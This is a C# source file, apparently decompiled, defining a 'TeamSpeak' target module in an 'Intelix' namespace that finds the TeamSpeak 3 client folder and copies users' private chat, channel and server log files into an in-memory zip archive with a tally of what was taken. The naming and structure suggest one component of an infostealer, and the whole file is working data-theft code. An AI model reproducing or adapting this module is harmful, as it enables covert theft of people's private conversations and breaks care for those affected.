using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using Intelix.Helper.Data;

namespace Intelix.Targets.Applications
{
	// Token: 0x02000052 RID: 82
	public class TeamSpeak : ITarget
	{
		// Token: 0x06000108 RID: 264 RVA: 0x0000F890 File Offset: 0x0000DA90
		public void Collect(InMemoryZip zip, Counter counter)
		{
			IEnumerable<string> source = new string[]
			{
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "TeamSpeak 3 Client"),
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "TeamSpeak 3 Client")
			};
			string text = source.FirstOrDefault(Directory.Exists);
			bool flag = string.IsNullOrEmpty(text);
			if (!flag)
			{
				string path = Path.Combine(text, "config", "chats");
				bool flag2 = !Directory.Exists(path);
				if (!flag2)
				{
					string[] directories = Directory.GetDirectories(path);
					bool flag3 = directories == null || directories.Length == 0;
					if (!flag3)
					{
						Counter.CounterApplications counterApplications = new Counter.CounterApplications();
						counterApplications.Name = "TeamSpeak";
						int num = 1;
						string[] array = directories;
						for (int i = 0; i < array.Length; i++)
						{
							string[] array2 = Directory.EnumerateFiles(array[i], "*.txt", SearchOption.TopDirectoryOnly).Where(delegate(string f)
							{
								string fileName = Path.GetFileName(f);
								bool flag6 = string.IsNullOrEmpty(fileName);
								bool result;
								if (flag6)
								{
									result = false;
								}
								else
								{
									bool flag7 = !this._collectChannelChats && fileName.StartsWith("channel", StringComparison.OrdinalIgnoreCase);
									if (flag7)
									{
										result = false;
									}
									else
									{
										bool flag8 = !this._collectServerLogs && fileName.StartsWith("server", StringComparison.OrdinalIgnoreCase);
										if (flag8)
										{
											result = false;
										}
										else
										{
											try
											{
												result = (new FileInfo(f).Length >= this._minFileSize);
											}
											catch
											{
												result = false;
											}
										}
									}
								}
								return result;
							}).ToArray<string>();
							bool flag4 = array2.Length == 0;
							if (!flag4)
							{
								string[] array3 = array2;
								foreach (string text2 in array3)
								{
									try
									{
										string text3 = string.Format("TeamSpeak\\{0}\\", num) + Path.GetFileName(text2);
										zip.AddFile(text3, File.ReadAllBytes(text2));
										counterApplications.Files.Add(text2 + " => " + text3);
									}
									catch
									{
									}
								}
								num++;
							}
						}
						bool flag5 = counterApplications.Files.Count > 0;
						if (flag5)
						{
							counterApplications.Files.Add("TeamSpeak\\");
							counter.Applications.Add(counterApplications);
						}
					}
				}
			}
		}

		// Token: 0x0400001A RID: 26
		private readonly bool _collectChannelChats = true;

		// Token: 0x0400001B RID: 27
		private readonly bool _collectServerLogs = true;

		// Token: 0x0400001C RID: 28
		private readonly long _minFileSize = 50L;
	}
}
